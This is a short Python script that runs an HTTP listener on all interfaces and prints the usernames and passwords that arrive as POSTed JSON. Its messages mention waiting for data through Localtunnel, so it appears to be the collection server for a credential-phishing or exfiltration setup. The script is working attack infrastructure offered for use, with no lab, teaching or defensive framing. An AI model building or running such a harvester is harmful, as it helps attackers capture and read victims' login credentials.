from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class SimpleListener(BaseHTTPRequestHandler):
    def do_POST(self):
        print(f"\n[!] DATA RECEIVED from {self.client_address[0]}!")
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > 0:
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                print("=" * 30)
                print(f"👤 USER: {data.get('username')}")
                print(f"🔑 PASS: {data.get('password')}")
                print("=" * 30)
            except Exception as e:
                print(f"Could not parse JSON: {post_data.decode('utf-8')}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        print(f"[!] GET request (Health Check)")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Listener is Active!")

def run(port=8000):
    print(f"[*] Starting Listener on all interfaces, port {port}...")
    httpd = HTTPServer(('0.0.0.0', port), SimpleListener)
    print("[*] Waiting for Localtunnel data...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
